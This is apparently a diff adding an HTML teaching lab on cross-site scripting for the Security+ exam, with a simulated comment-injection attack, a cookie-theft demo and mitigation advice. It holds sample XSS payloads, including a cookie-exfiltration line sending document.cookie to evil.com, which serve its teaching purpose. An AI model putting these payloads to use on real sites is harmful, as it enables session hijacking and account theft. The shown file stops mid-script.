@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Attack Simulator — Security+ Lab</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Inter:wght@300;400;500&display=swap');
+
+  :root {
+    --bg:        #080c10;
+    --surface:   #0d1117;
+    --panel:     #111820;
+    --border:    #1e2d3d;
+    --red:       #ff3e3e;
+    --red-dim:   #cc2222;
+    --green:     #00d68f;
+    --green-dim: #009960;
+    --amber:     #ffaa00;
+    --blue:      #4da6ff;
+    --muted:     #4a6070;
+    --text:      #c9d4dc;
+    --text-dim:  #7a8f9f;
+    --mono:      'Share Tech Mono', monospace;
+    --ui:        'Rajdhani', sans-serif;
+    --body:      'Inter', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.06) 2px,
+      rgba(0,0,0,0.06) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── HEADER ── */
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 18px 32px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    background: var(--surface);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .threat-badge {
+    background: var(--red);
+    color: #000;
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: bold;
+    padding: 3px 8px;
+    letter-spacing: 2px;
+    clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
+  }
+
+  header h1 {
+    font-family: var(--ui);
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: #fff;
+  }
+
+  header h1 span { color: var(--red); }
+
+  .course-tag {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+  }
+
+  /* ── LAYOUT ── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 28px 32px 60px; }
+
+  /* ── PHASE NAV ── */
+  .phase-nav {
+    display: flex;
+    gap: 0;
+    margin-bottom: 32px;
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .phase-btn {
+    flex: 1;
+    background: var(--surface);
+    border: none;
+    border-right: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: var(--ui);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    padding: 12px 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .phase-btn:last-child { border-right: none; }
+
+  .phase-btn .num {
+    font-family: var(--mono);
+    font-size: 18px;
+    color: var(--border);
+    transition: color 0.2s;
+  }
+
+  .phase-btn:hover { background: var(--panel); color: var(--text); }
+  .phase-btn:hover .num { color: var(--muted); }
+
+  .phase-btn.active {
+    background: var(--panel);
+    color: var(--amber);
+    border-bottom: 2px solid var(--amber);
+  }
+
+  .phase-btn.active .num { color: var(--amber); }
+
+  .phase-btn.done { color: var(--green-dim); }
+  .phase-btn.done .num { color: var(--green-dim); }
+
+  /* ── PHASE PANELS ── */
+  .phase { display: none; }
+  .phase.active { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+  .phase.single { display: block; }
+  .phase.wide { grid-template-columns: 1fr; }
+
+  /* ── CARD ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 24px;
+    position: relative;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 2px;
+  }
+
+  .card.red::before { background: var(--red); }
+  .card.green::before { background: var(--green); }
+  .card.amber::before { background: var(--amber); }
+  .card.blue::before { background: var(--blue); }
+
+  .card-title {
+    font-family: var(--ui);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .card-title .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--muted);
+  }
+
+  .card.red .card-title .dot { background: var(--red); }
+  .card.green .card-title .dot { background: var(--green); }
+  .card.amber .card-title .dot { background: var(--amber); }
+  .card.blue .card-title .dot { background: var(--blue); }
+
+  /* ── CONCEPT BOX ── */
+  .concept {
+    font-size: 13px;
+    color: var(--text-dim);
+    line-height: 1.7;
+    margin-bottom: 16px;
+  }
+
+  .concept strong { color: var(--text); }
+  .concept .highlight { color: var(--amber); font-family: var(--mono); font-size: 12px; }
+  .concept .danger { color: var(--red); }
+  .concept .safe { color: var(--green); }
+
+  /* ── ATTACK DIAGRAM ── */
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin: 16px 0;
+    flex-wrap: wrap;
+  }
+
+  .flow-node {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 6px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text);
+    white-space: nowrap;
+  }
+
+  .flow-node.red { border-color: var(--red); color: var(--red); }
+  .flow-node.green { border-color: var(--green); color: var(--green); }
+  .flow-node.amber { border-color: var(--amber); color: var(--amber); }
+
+  .flow-arrow {
+    color: var(--muted);
+    font-size: 16px;
+  }
+
+  /* ── INPUT / TEXTAREA ── */
+  input[type=text], textarea, select {
+    width: 100%;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 10px 14px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  input[type=text]:focus, textarea:focus {
+    border-color: var(--amber);
+  }
+
+  textarea { resize: vertical; min-height: 80px; }
+
+  label {
+    display: block;
+    font-family: var(--ui);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+
+  .field { margin-bottom: 16px; }
+
+  /* ── BUTTON ── */
+  .btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--ui);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    padding: 10px 24px;
+    cursor: pointer;
+    transition: all 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .btn:hover { background: var(--panel); border-color: var(--muted); }
+
+  .btn.danger {
+    border-color: var(--red-dim);
+    color: var(--red);
+  }
+  .btn.danger:hover { background: rgba(255,62,62,0.08); border-color: var(--red); }
+
+  .btn.primary {
+    border-color: var(--amber);
+    color: var(--amber);
+  }
+  .btn.primary:hover { background: rgba(255,170,0,0.08); }
+
+  .btn.safe-btn {
+    border-color: var(--green-dim);
+    color: var(--green);
+  }
+  .btn.safe-btn:hover { background: rgba(0,214,143,0.08); }
+
+  .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 12px; }
+
+  /* ── BROWSER MOCK ── */
+  .browser {
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .browser-bar {
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .browser-dots { display: flex; gap: 5px; }
+  .browser-dots span {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--border);
+  }
+
+  .browser-url {
+    flex: 1;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    padding: 4px 10px;
+  }
+
+  .browser-body {
+    background: #1a2030;
+    min-height: 180px;
+    padding: 20px;
+    position: relative;
+    overflow: auto;
+  }
+
+  /* ── COMMENT FEED ── */
+  .comment-feed { display: flex; flex-direction: column; gap: 12px; }
+
+  .comment {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 12px 14px;
+  }
+
+  .comment .author {
+    font-family: var(--ui);
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--blue);
+    margin-bottom: 4px;
+  }
+
+  .comment .body {
+    font-size: 13px;
+    color: #c0ccd4;
+    line-height: 1.5;
+  }
+
+  /* ── ATTACK LOG ── */
+  .log {
+    background: #000;
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 14px;
+    max-height: 200px;
+    overflow-y: auto;
+    line-height: 1.8;
+  }
+
+  .log .entry { display: flex; gap: 10px; }
+  .log .ts { color: var(--muted); white-space: nowrap; }
+  .log .msg { color: var(--text); }
+  .log .msg.ok { color: var(--green); }
+  .log .msg.warn { color: var(--amber); }
+  .log .msg.err { color: var(--red); }
+
+  /* ── STOLEN DATA ── */
+  .stolen-data {
+    background: var(--panel);
+    border: 1px solid var(--red-dim);
+    padding: 16px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text);
+    line-height: 1.9;
+    min-height: 80px;
+  }
+
+  .stolen-key { color: var(--red); }
+  .stolen-val { color: var(--amber); }
+
+  /* ── PAYLOAD LIBRARY ── */
+  .payload-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 12px;
+  }
+
+  .payload-item {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--red-dim);
+    padding: 10px 12px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .payload-item:hover {
+    border-left-color: var(--red);
+    background: rgba(255,62,62,0.05);
+  }
+
+  .payload-item .pl-name {
+    font-family: var(--ui);
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--red);
+    margin-bottom: 4px;
+  }
+
+  .payload-item .pl-code {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    word-break: break-all;
+  }
+
+  /* ── SECTION DIVIDER ── */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin: 24px 0 18px;
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+  }
+
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ── TOOLTIP / CALLOUT ── */
+  .callout {
+    border-left: 3px solid var(--amber);
+    padding: 10px 14px;
+    background: rgba(255,170,0,0.06);
+    font-size: 12px;
+    color: var(--text-dim);
+    margin: 12px 0;
+    line-height: 1.6;
+  }
+
+  .callout.info { border-color: var(--blue); background: rgba(77,166,255,0.06); }
+  .callout.danger { border-color: var(--red); background: rgba(255,62,62,0.06); color: var(--text); }
+  .callout strong { color: var(--text); }
+
+  /* ── MITIGATION COMPARE ── */
+  .compare-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+
+  .compare-bad, .compare-good {
+    padding: 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.7;
+    border: 1px solid;
+  }
+
+  .compare-bad { border-color: var(--red-dim); background: rgba(255,62,62,0.05); }
+  .compare-good { border-color: var(--green-dim); background: rgba(0,214,143,0.05); }
+
+  .compare-label {
+    font-family: var(--ui);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .compare-bad .compare-label { color: var(--red); }
+  .compare-good .compare-label { color: var(--green); }
+
+  code { font-family: var(--mono); font-size: 11px; background: var(--panel); padding: 1px 5px; }
+
+  /* ── ALERT MODAL ── */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .modal-overlay.show { display: flex; }
+
+  .modal {
+    background: var(--surface);
+    border: 2px solid var(--red);
+    padding: 32px;
+    max-width: 460px;
+    width: 90%;
+    position: relative;
+    animation: shake 0.4s ease;
+  }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    40% { transform: translateX(6px); }
+    60% { transform: translateX(-4px); }
+    80% { transform: translateX(4px); }
+  }
+
+  .modal-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--red);
+    margin-bottom: 12px;
+  }
+
+  .modal-body {
+    font-size: 13px;
+    margin-bottom: 20px;
+    color: var(--text);
+    line-height: 1.6;
+  }
+
+  .modal-body strong { color: var(--amber); }
+
+  /* ── FLICKER ANIMATION ── */
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    92% { opacity: 1; }
+    93% { opacity: 0.4; }
+    94% { opacity: 1; }
+    96% { opacity: 0.2; }
+    97% { opacity: 1; }
+  }
+
+  .flicker { animation: flicker 6s infinite; }
+
+  /* ── PILL ── */
+  .pill {
+    display: inline-block;
+    padding: 2px 8px;
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: bold;
+    letter-spacing: 1px;
+  }
+  .pill.red { background: rgba(255,62,62,0.15); border: 1px solid var(--red-dim); color: var(--red); }
+  .pill.green { background: rgba(0,214,143,0.12); border: 1px solid var(--green-dim); color: var(--green); }
+  .pill.amber { background: rgba(255,170,0,0.12); border: 1px solid var(--amber); color: var(--amber); }
+  .pill.blue { background: rgba(77,166,255,0.12); border: 1px solid var(--blue); color: var(--blue); }
+
+  /* full-width section */
+  .full { grid-column: 1 / -1; }
+
+  /* ── PROGRESS ── */
+  .progress-strip {
+    height: 3px;
+    background: var(--border);
+    margin-bottom: 28px;
+  }
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--red), var(--amber));
+    transition: width 0.4s;
+  }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--panel); }
+  ::-webkit-scrollbar-thumb { background: var(--border); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="threat-badge">SIMULATED</div>
+  <h1 class="flicker">Cross-Site <span>Scripting</span> Lab</h1>
+  <span class="course-tag">Security+ SY0-701 · 2.3</span>
+</header>
+
+<div class="container">
+
+  <!-- Progress -->
+  <div class="progress-strip">
+    <div class="progress-fill" id="progressFill" style="width:25%"></div>
+  </div>
+
+  <!-- Phase nav -->
+  <nav class="phase-nav">
+    <button class="phase-btn active" onclick="goPhase(1)">
+      <span class="num">01</span>WHAT IS XSS
+    </button>
+    <button class="phase-btn" onclick="goPhase(2)">
+      <span class="num">02</span>SIMULATE ATTACK
+    </button>
+    <button class="phase-btn" onclick="goPhase(3)">
+      <span class="num">03</span>COOKIE THEFT
+    </button>
+    <button class="phase-btn" onclick="goPhase(4)">
+      <span class="num">04</span>MITIGATIONS
+    </button>
+  </nav>
+
+  <!-- ══════════════ PHASE 1: WHAT IS XSS ══════════════ -->
+  <div class="phase active" id="phase1">
+
+    <div class="card amber">
+      <div class="card-title"><span class="dot"></span>THE CORE CONCEPT</div>
+      <div class="concept">
+        <strong>Cross-Site Scripting (XSS)</strong> lets an attacker inject malicious JavaScript into a webpage that is then executed inside <span class="danger">other users' browsers</span> — not the attacker's.
+        <br><br>
+        The key insight: the server trusts user input and reflects it back as HTML without sanitizing it. The browser sees it as <span class="highlight">&lt;script&gt;</span> and runs it.
+      </div>
+
+      <div class="divider">ATTACK FLOW</div>
+
+      <div class="flow">
+        <div class="flow-node red">Attacker</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-node amber">Submits payload<br>to website</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-node">Server stores it</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-node amber">Victim visits page</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-node red">Script runs in<br>victim's browser</div>
+      </div>
+
+      <div class="callout danger">
+        <strong>Exam tip:</strong> XSS targets <em>other users' browsers</em>. If a question says "malicious script executes when another user visits the page" — that's XSS.
+      </div>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>THREE TYPES TO KNOW</div>
+
+      <div style="display:flex;flex-direction:column;gap:14px;">
+
+        <div style="border:1px solid var(--border);padding:14px;border-left:3px solid var(--red);">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--red);font-size:13px;margin-bottom:6px;">
+            STORED XSS <span class="pill red">Most Dangerous</span>
+          </div>
+          <div class="concept">Payload is saved in the database (e.g., a comment). Every user who loads the page runs the script. <strong>Persistent</strong> — works even after attacker logs off.</div>
+          <div class="callout danger" style="margin:8px 0 0;">
+            Example: Attacker posts a comment containing <code>&lt;script&gt;stealCookies()&lt;/script&gt;</code>. Everyone who views comments is compromised.
+          </div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;border-left:3px solid var(--amber);">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--amber);font-size:13px;margin-bottom:6px;">
+            REFLECTED XSS <span class="pill amber">One-Time</span>
+          </div>
+          <div class="concept">Payload is in a URL. Server reflects it back in the response without storing it. Requires tricking the victim into clicking a crafted link.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;border-left:3px solid var(--blue);">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--blue);font-size:13px;margin-bottom:6px;">
+            DOM-BASED XSS <span class="pill blue">Client-Side</span>
+          </div>
+          <div class="concept">Happens entirely in the browser's DOM — the server never sees the payload. JavaScript reads attacker-controlled input (URL hash, etc.) and writes it directly to the page.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card blue full">
+      <div class="card-title"><span class="dot"></span>XSS vs SQLi vs CSRF — EXAM DIFFERENTIATOR</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-top:4px;">
+        <div>
+          <div style="font-family:var(--ui);font-weight:700;color:var(--red);margin-bottom:8px;font-size:13px;">XSS</div>
+          <div class="concept">Target: <strong>Other users' browsers</strong><br>Payload: JavaScript in input fields<br>Goal: Execute code in victim's browser<br>Look for: <code>&lt;script&gt;</code>, cookie theft, defacement</div>
+        </div>
+        <div>
+          <div style="font-family:var(--ui);font-weight:700;color:var(--amber);margin-bottom:8px;font-size:13px;">SQL INJECTION</div>
+          <div class="concept">Target: <strong>The database</strong><br>Payload: SQL syntax in input fields<br>Goal: Read/modify/delete DB records<br>Look for: <code>OR 1=1--</code>, SQL keywords</div>
+        </div>
+        <div>
+          <div style="font-family:var(--ui);font-weight:700;color:var(--blue);margin-bottom:8px;font-size:13px;">CSRF</div>
+          <div class="concept">Target: <strong>The victim's authenticated session</strong><br>Payload: Hidden requests, forged forms<br>Goal: Perform action victim didn't intend<br>Look for: "forged request", state-change</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:flex-end;">
+      <button class="btn primary" onclick="goPhase(2)">SIMULATE AN ATTACK →</button>
+    </div>
+  </div>
+
+  <!-- ══════════════ PHASE 2: STORED XSS SIMULATION ══════════════ -->
+  <div class="phase" id="phase2">
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>ATTACKER'S CONSOLE</div>
+
+      <div class="concept" style="margin-bottom:14px;">
+        You are the attacker. This site has a comment section that <strong>does not sanitize input</strong>. Post a comment containing JavaScript and watch it execute in every visitor's browser.
+      </div>
+
+      <div class="field">
+        <label>Your username</label>
+        <input type="text" id="attackerName" value="h4x0r99" />
+      </div>
+
+      <div class="field">
+        <label>Comment (inject your payload here)</label>
+        <textarea id="attackInput" placeholder="Type a normal comment, or inject a payload...">Great tutorial!</textarea>
+      </div>
+
+      <div class="divider">PAYLOAD LIBRARY — CLICK TO LOAD</div>
+
+      <div class="payload-grid">
+        <div class="payload-item" onclick="loadPayload('alert')">
+          <div class="pl-name">Alert Box</div>
+          <div class="pl-code">&lt;script&gt;alert('XSS!')&lt;/script&gt;</div>
+        </div>
+        <div class="payload-item" onclick="loadPayload('img')">
+          <div class="pl-name">Image onerror</div>
+          <div class="pl-code">&lt;img src=x onerror=alert('XSS!')&gt;</div>
+        </div>
+        <div class="payload-item" onclick="loadPayload('cookie')">
+          <div class="pl-name">Cookie Stealer</div>
+          <div class="pl-code">&lt;script&gt;stealCookies()&lt;/script&gt;</div>
+        </div>
+        <div class="payload-item" onclick="loadPayload('deface')">
+          <div class="pl-name">Page Defacement</div>
+          <div class="pl-code">&lt;script&gt;defacePage()&lt;/script&gt;</div>
+        </div>
+        <div class="payload-item" onclick="loadPayload('keylog')">
+          <div class="pl-name">Keylogger</div>
+          <div class="pl-code">&lt;script&gt;installKeylogger()&lt;/script&gt;</div>
+        </div>
+        <div class="payload-item" onclick="loadPayload('redirect')">
+          <div class="pl-name">Redirect Victim</div>
+          <div class="pl-code">&lt;script&gt;redirectVictim()&lt;/script&gt;</div>
+        </div>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn danger" onclick="postComment()">⚡ POST MALICIOUS COMMENT</button>
+        <button class="btn" onclick="resetComments()">RESET</button>
+      </div>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>VULNERABLE WEBSITE — VICTIM'S VIEW</div>
+
+      <div class="concept" style="margin-bottom:12px;">
+        Every user who visits this page will have any embedded scripts run automatically in their browser.
+      </div>
+
+      <div class="browser">
+        <div class="browser-bar">
+          <div class="browser-dots"><span></span><span></span><span></span></div>
+          <div class="browser-url">http://vulnerable-bank.com/discussion</div>
+        </div>
+        <div class="browser-body">
+          <div style="font-family:var(--ui);font-size:16px;font-weight:700;color:#fff;margin-bottom:14px;">Community Discussion Board</div>
+          <div class="comment-feed" id="commentFeed">
+            <div class="comment">
+              <div class="author">alice_2024</div>
+              <div class="body">Has anyone tried the new transfer feature? Works great!</div>
+            </div>
+            <div class="comment">
+              <div class="author">bob_investor</div>
+              <div class="body">Yes, really intuitive. The new dashboard is much faster too.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="divider">EXECUTION LOG</div>
+      <div class="log" id="execLog">
+        <div class="entry"><span class="ts">[SYS]</span><span class="msg ok">Page loaded. Awaiting comments...</span></div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:space-between;align-items:center;">
+      <button class="btn" onclick="goPhase(1)">← BACK</button>
+      <button class="btn primary" onclick="goPhase(3)">UNDERSTAND COOKIE THEFT →</button>
+    </div>
+  </div>
+
+  <!-- ══════════════ PHASE 3: COOKIE THEFT ══════════════ -->
+  <div class="phase" id="phase3">
+
+    <div class="card amber">
+      <div class="card-title"><span class="dot"></span>WHAT COOKIES CONTAIN</div>
+
+      <div class="concept">
+        When a user logs into a website, the server sets a <strong>session cookie</strong>. This cookie is automatically sent with every request — it's how the server knows "this is Alice, she's already logged in."
+        <br><br>
+        XSS can read this cookie via <code>document.cookie</code> and send it to the attacker's server. The attacker can then <span class="danger">impersonate the victim</span> without ever knowing their password.
+      </div>
+
+      <div class="callout info">
+        <strong>Why it works:</strong> JavaScript running in a browser can access <code>document.cookie</code> for the current domain — unless the cookie has the <code>HttpOnly</code> flag set.
+      </div>
+
+      <div class="divider">SIMULATED SESSION</div>
+
+      <div style="margin-bottom:14px;">
+        <div style="font-family:var(--ui);font-size:11px;font-weight:700;letter-spacing:1px;color:var(--text-dim);text-transform:uppercase;margin-bottom:8px;">Victim's Browser Cookies</div>
+        <div class="stolen-data" id="victimCookies">
+          <span class="stolen-key">sessionid</span>=<span class="stolen-val">8f14e45f-ceea-367f-a27f-e0e6b4a7c3d1</span><br>
+          <span class="stolen-key">auth_token</span>=<span class="stolen-val">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br>
+          <span class="stolen-key">user_prefs</span>=<span class="stolen-val">theme=dark&lang=en</span><br>
+          <span class="stolen-key">CSRF_token</span>=<span class="stolen-val">4c56-af8b-1923</span>
+        </div>
+      </div>
+
+      <button class="btn danger" onclick="simulateTheft()">⚡ EXECUTE COOKIE THEFT PAYLOAD</button>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>ATTACKER'S COLLECTION SERVER</div>
+
+      <div class="concept" style="margin-bottom:14px;">
+        The XSS payload sends stolen cookies to a server the attacker controls, typically via a request like:
+        <br><br>
+        <code style="font-size:10px;display:block;padding:8px;background:var(--panel);line-height:1.8;">new Image().src = "https://evil.com/steal?" + document.cookie</code>
+      </div>
+
+      <div style="font-family:var(--ui);font-size:11px;font-weight:700;letter-spacing:1px;color:var(--text-dim);text-transform:uppercase;margin-bottom:8px;">Captured Data</div>
+      <div class="stolen-data" id="stolenDisplay" style="min-height:120px;">
+        <span style="color:var(--muted);">— Waiting for payload execution —</span>
+      </div>
+
+      <div class="divider">WHAT THE ATTACKER CAN DO</div>
+
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <div class="callout danger">
+          <strong>Session Hijacking:</strong> Paste the stolen session cookie into their own browser. The server sees it as a valid session.
+        </div>
+        <div class="callout danger">
+          <strong>Account Takeover:</strong> Transfer funds, change email/password, exfiltrate data — all as the victim.
+        </div>
+        <div class="callout danger">
+          <strong>Lateral Movement:</strong> If session is for an admin, full platform compromise.
+        </div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:space-between;align-items:center;">
+      <button class="btn" onclick="goPhase(2)">← BACK</button>
+      <button class="btn primary" onclick="goPhase(4)">HOW TO STOP IT →</button>
+    </div>
+  </div>
+
+  <!-- ══════════════ PHASE 4: MITIGATIONS + QUIZ ══════════════ -->
+  <div class="phase" id="phase4">
+
+    <div class="card green full">
+      <div class="card-title"><span class="dot"></span>HOW TO STOP XSS</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:20px;">
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">1. Input Validation + Output Encoding</div>
+          <div class="concept">Never trust user input. Encode all output so <code>&lt;script&gt;</code> becomes <code>&amp;lt;script&amp;gt;</code> — the browser displays it as text, never executes it.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">2. Content Security Policy (CSP)</div>
+          <div class="concept">An HTTP header that tells the browser <em>which</em> scripts are allowed to run. Blocks inline scripts and scripts from untrusted origins.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">3. HttpOnly Cookie Flag</div>
+          <div class="concept">Marks session cookies so JavaScript <em>cannot</em> access them. Eliminates cookie theft via XSS. The <code>Secure</code> flag prevents transmission over HTTP.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">4. Web Application Firewall (WAF)</div>
+          <div class="concept">Sits in front of the application and inspects requests. Can detect and block known XSS patterns before they reach the server.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">5. Modern Frameworks</div>
+          <div class="concept">React, Angular, Vue automatically encode values before rendering to the DOM, making stored XSS much harder to introduce accidentally.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">6. SameSite Cookie Attribute</div>
+          <div class="concept">Restricts cookies from being sent in cross-site requests. Reduces the impact of CSRF attacks that pair with XSS.</div>
+        </div>
+      </div>
+
+      <div class="divider">VULNERABLE vs SAFE CODE</div>
+
+      <div class="compare-row">
+        <div>
+          <div class="compare-bad">
+            <div class="compare-label">❌ Vulnerable</div>
+            <span style="color:var(--muted)">// Directly inserts user input as HTML</span><br>
+            element.innerHTML = userComment;<br><br>
+            <span style="color:var(--muted)">// Attacker posts: &lt;script&gt;stealCookies()&lt;/script&gt;</span><br>
+            <span style="color:var(--red)">// Script executes in every visitor's browser</span>
+          </div>
+        </div>
+        <div>
+          <div class="compare-good">
+            <div class="compare-label">✓ Safe</div>
+            <span style="color:var(--muted)">// Sets text content, never parsed as HTML</span><br>
+            element.textContent = userComment;<br><br>
+            <span style="color:var(--muted)">// Or encode before inserting:</span><br>
+            element.innerHTML = encode(userComment);<br>
+            <span style="color:var(--green)">// &lt;script&gt; becomes &amp;lt;script&amp;gt; — safe text</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:flex-start;">
+      <button class="btn" onclick="goPhase(3)">← BACK</button>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<!-- Alert modal (simulates XSS alert box) -->
+<div class="modal-overlay" id="alertModal">
+  <div class="modal">
+    <div class="modal-title">⚠ BROWSER ALERT — SIMULATED XSS EXECUTION</div>
+    <div class="modal-body" id="alertBody">XSS Payload Fired!</div>
+    <button class="btn primary" onclick="closeModal()">ACKNOWLEDGE</button>
+  </div>
+</div>
+
+<script>
+// ── STATE ──────────────────────────────────────────────────────
+let currentPhase = 1;
+
+// ── NAVIGATION ─────────────────────────────────────────────────
+function goPhase(n) {
+  document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.phase-btn').forEach((b, i) => {
+    b.classList.remove('active');
+    if (i + 1 < n) b.classList.add('done'); else b.classList.remove('done');
+  });
+  document.getElementById('phase' + n).classList.add('active');
+  document.querySelectorAll('.phase-btn')[n - 1].classList.add('active');
